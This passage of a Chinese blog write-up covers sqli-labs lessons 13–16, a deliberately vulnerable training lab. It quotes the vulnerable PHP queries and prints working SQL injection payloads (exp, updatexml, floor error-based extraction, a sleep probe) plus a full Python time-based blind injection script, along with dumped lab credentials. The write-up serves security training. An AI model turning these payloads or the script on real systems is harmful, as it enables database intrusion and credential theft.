+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma># 闭合语句
+admin&#39;) or 1=1#</pre></td></tr></table></div></div><p>使用前文的二分法爆数据，payload 注意要使用单引号和括号闭合语句。</p><h2 id=less-14>Less-14</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>	$uname=&#39;&#34;&#39;.$uname.&#39;&#34;&#39;;
+	$passwd=&#39;&#34;&#39;.$passwd.&#39;&#34;&#39;;
+	@$sql=&#34;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>使用 exp 爆数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>admin&#34; union select (exp(~(select * from (select concat(0x03,password,0x03,username) from security.users limit 1,1)a))),2#
+# 页面
+DOUBLE value is out of range in &#39;exp(~((select &#39;I-kill-youAngelina&#39; from dual)))&#39;</pre></td></tr></table></div></div><p>使用updatexml 爆数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></pre></td><td class=lntd><pre class=chroma>admin“ and (uploadxml(1,database()))#
+# 页面
+FUNCTION security.uploadxml does not exist
+
+admin” and updatexml(2,concat(0x7e,(select GROUP_CONCAT(id,&#34;-&#34;,username,&#34;:&#34;,password) from security.users),0x7e),1)#
+页面
+XPATH syntax error: &#39;~1-Dumb:Dumb,2-Angelina:I-kill-y&#39;</pre></td></tr></table></div></div><p>使用 floor 爆数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>admin&#34; union Select count(*),concat(0x3a,(select concat(id,0x3a,username,0x3a,password) from security.users limit 1,1),0x3a,floor(rand(0)*2)) a from information_schema.columns group by a#
+# 页面
+Duplicate entry &#39;:2:Angelina:I-kill-you:1&#39; for key &#39;group_key&#39;</pre></td></tr></table></div></div><h2 id=less-15>Less-15</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>@$sql=&#34;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>页面无返回，使用bool型或者tim型盲注猜数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma>admin&#39; and sleep(5)#
+# 页面延迟5s返回</pre></td></tr></table></div></div><p>爆数据使用 <a href=https://github.com/WangYihang/sqli-labs/blob/master/writeup/Lesson-15.md>WangYiHang 的二分法脚本</a>，整体逻辑还是相对较为简单的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
+<span class=c1># encoding:utf8</span>
+
+<span class=kn>import</span> <span class=nn>requests</span>
+<span class=kn>import</span> <span class=nn>time</span>
+<span class=kn>import</span> <span class=nn>sys</span>
+
+<span class=c1># config-start</span>
+<span class=n>sleep_time</span> <span class=o>=</span> <span class=mi>1</span>
+<span class=n>error_time</span> <span class=o>=</span> <span class=mf>0.1</span>
+<span class=c1># config-end</span>
+
+<span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span>
+    <span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>,</span>
+    <span class=s2>&#34;https&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span>
+<span class=p>}</span>
+
+
+<span class=k>def</span> <span class=nf>getPayload</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>mid</span><span class=p>):</span>
+    <span class=c1># admin&#39; or ()--</span>
+    <span class=n>column_name</span> <span class=o>=</span> <span class=s2>&#34;schema_name&#34;</span>
+    <span class=n>table_name</span> <span class=o>=</span> <span class=s2>&#34;schemata&#34;</span>
+    <span class=n>database_name</span> <span class=o>=</span> <span class=s2>&#34;information_schema&#34;</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=p>(</span>
+        <span class=s2>&#34;((ascii(substring((select &#34;</span>
+        <span class=o>+</span> <span class=n>column_name</span>
+        <span class=o>+</span> <span class=s2>&#34; from &#34;</span>
+        <span class=o>+</span> <span class=n>database_name</span>
+        <span class=o>+</span> <span class=s2>&#34;.&#34;</span>
+        <span class=o>+</span> <span class=n>table_name</span>
+        <span class=o>+</span> <span class=s2>&#34;  limit &#34;</span>
+        <span class=o>+</span> <span class=n>indexOfResult</span>
+        <span class=o>+</span> <span class=s2>&#34;,1),&#34;</span>
+        <span class=o>+</span> <span class=n>indexOfChar</span>
+        <span class=o>+</span> <span class=s2>&#34;,1)))&gt;&#34;</span>
+        <span class=o>+</span> <span class=n>mid</span>
+        <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
+    <span class=p>)</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
+        <span class=s2>&#34;uname&#34;</span><span class=p>:</span> <span class=s2>&#34;&#39; or ((&#34;</span> <span class=o>+</span> <span class=n>payload</span> <span class=o>+</span> <span class=s2>&#34;) and sleep(&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>sleep_time</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;))-- &#34;</span><span class=p>,</span>
+        <span class=s2>&#34;passwd&#34;</span><span class=p>:</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span>
+    <span class=p>}</span>
+    <span class=k>return</span> <span class=n>payload</span>
+
+
+<span class=k>def</span> <span class=nf>exce</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>queryASCII</span><span class=p>):</span>
+    <span class=c1># content-start</span>
+    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://172.20.163.248/Less-15/&#34;</span>
+    <span class=n>postData</span> <span class=o>=</span> <span class=n>getPayload</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>queryASCII</span><span class=p>)</span>
+    <span class=n>before_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+    <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>postData</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span>
+    <span class=n>after_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+    <span class=c1># content-end</span>
+    <span class=n>use_time</span> <span class=o>=</span> <span class=n>after_time</span> <span class=o>-</span> <span class=n>before_time</span>
+    <span class=c1># judge-start</span>
+    <span class=c1># 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)</span>
+    <span class=c1># 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了</span>
+    <span class=k>if</span> <span class=nb>abs</span><span class=p>(</span><span class=n>use_time</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>error_time</span><span class=p>:</span>
+        <span class=k>return</span> <span class=bp>True</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=k>return</span> <span class=bp>False</span>
+    <span class=c1># judge-end</span>
+
+
+<span class=k>def</span> <span class=nf>doubleSearch</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>left_number</span><span class=p>,</span> <span class=n>right_number</span><span class=p>):</span>
+    <span class=k>while</span> <span class=n>left_number</span> <span class=o>&lt;</span> <span class=n>right_number</span><span class=p>:</span>
+        <span class=n>mid</span> <span class=o>=</span> <span class=nb>int</span><span class=p>((</span><span class=n>left_number</span> <span class=o>+</span> <span class=n>right_number</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span><span class=p>)</span>
+        <span class=k>if</span> <span class=n>exce</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>indexOfChar</span> <span class=o>+</span> <span class=mi>1</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>mid</span><span class=p>)):</span>
+            <span class=n>left_number</span> <span class=o>=</span> <span class=n>mid</span>
+        <span class=k>else</span><span class=p>:</span>
+            <span class=n>right_number</span> <span class=o>=</span> <span class=n>mid</span>
+        <span class=k>if</span> <span class=n>left_number</span> <span class=o>==</span> <span class=n>right_number</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
+            <span class=k>if</span> <span class=n>exce</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>indexOfChar</span> <span class=o>+</span> <span class=mi>1</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>mid</span><span class=p>)):</span>
+                <span class=n>mid</span> <span class=o>+=</span> <span class=mi>1</span>
+                <span class=k>break</span>
+            <span class=k>else</span><span class=p>:</span>
+                <span class=k>break</span>
+    <span class=k>return</span> <span class=nb>chr</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span>
+
+
+<span class=k>def</span> <span class=nf>search</span><span class=p>():</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>  <span class=c1># 需要遍历的查询结果的数量</span>
+        <span class=n>counter</span> <span class=o>=</span> <span class=mi>0</span>
+        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>  <span class=c1># 结果的长度</span>
+            <span class=n>counter</span> <span class=o>+=</span> <span class=mi>1</span>
+            <span class=n>temp</span> <span class=o>=</span> <span class=n>doubleSearch</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>128</span><span class=p>)</span>  <span class=c1># 从255开始查询</span>
+            <span class=k>if</span> <span class=nb>ord</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># 当为1的时候说明已经查询结束</span>
+                <span class=k>break</span>
+            <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span>
+            <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+        <span class=k>if</span> <span class=n>counter</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># 当结果集的所有行都被遍历后退出</span>
+            <span class=k>break</span>
+        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
+        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+
+
+<span class=n>search</span><span class=p>()</span></code></pre></td></tr></table></div></div><h2 id=less-16>Less-16</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>	$uname=&#39;&#34;&#39;.$uname.&#39;&#34;&#39;;
+	$passwd=&#39;&#34;&#39;.$passwd.&#39;&#34;&#39;;
+	@$sql=&#34;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>单引号变为双引号，其他和Less-15一样</p><h2 id=reference>Reference</h2><p><a href=https://github.com/WangYihang/sqli-labs>https://github.com/WangYihang/sqli-labs</a></p><p><a href=https://xz.aliyun.com/t/7169>https://xz.aliyun.com/t/7169</a></p></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content><a href=https://moond4rk.xyz/>moonD4rk</a></span></p><p class=copyright-item><span class=item-title>初次发布</span>
+<span class=item-content>2019-08-18</span></p><p class=copyright-item><span class=item-title>永久链接</span>
+<span class=item-content><a href=https://moond4rk.xyz/post/sqlilabs-wirteup-7to16/>https://moond4rk.xyz/post/sqlilabs-wirteup-7to16/</a></span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/sql%E6%B3%A8%E5%85%A5/>SQL注入</a>
+<a href=/tags/%E5%AE%89%E5%85%A8/>安全</a>
+<a href=/tags/writeup/>writeup</a>
+<a href=/tags/sqli-labs/>sqli-labs</a></div><nav class=post-nav><a class=prev href=/post/xsstrike-source-code-read/><i class="iconfont icon-left"></i><span class="prev-text nav-default">XSStrike 源码阅读</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/sqlilabs-wirteup-1to6/><span class="next-text nav-default">Sqli-labs Wirteup 1-6</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:cranelee13&#43;blog@gmail.com class="iconfont icon-email" title=email></a><a href=https://github.com/moonD4rk class="iconfont icon-github" title=github></a><a href=https://moond4rk.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
+<span class=division>|</span>
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
+2020
+<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>moonD4rk</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script type=text/javascript src=/lib/jquery/jquery-3.2.1.min.js></script><script type=text/javascript src=/lib/slideout/slideout-1.0.1.min.js></script><script type=text/javascript src=/lib/fancybox/jquery.fancybox-3.1.20.min.js></script><script type=text/javascript src=/dist/even.26188efa.min.js></script></body></html>
